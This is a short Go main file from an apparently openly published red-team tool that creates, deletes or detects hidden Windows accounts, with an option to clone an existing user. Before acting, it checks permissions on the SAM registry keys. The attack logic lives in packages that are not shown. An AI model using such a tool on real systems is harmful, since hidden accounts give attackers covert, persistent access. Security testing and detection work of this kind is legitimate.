// Author : TeamsSix
// Blog : teamssix.com
// WeChat Official Accounts: TeamsSix

package main

import (
	"wgpsec.org/createHiddenAccount/common"
	"wgpsec.org/createHiddenAccount/core"
)

func main() {
	username, password, deleteusername, cloneuser, onlycreate, check := common.Flag()
	common.DetermineRegistryPermissions("SAM\\SAM")
	common.DetermineRegistryPermissions("SAM\\SAM\\Domains")
	common.DetermineRegistryPermissions("SAM\\SAM\\Domains\\Account")
	common.DetermineRegistryPermissions("SAM\\SAM\\Domains\\Account\\Users")
	common.DetermineRegistryPermissions("SAM\\SAM\\Domains\\Account\\Users\\Names")
	if check {
		core.CheckHiddenAccounts()
	} else if deleteusername != "" {
		core.DeleteHiddenAccount(deleteusername)
	} else {
		core.CreateHiddenAccount(username, password, cloneuser, onlycreate)
	}
}
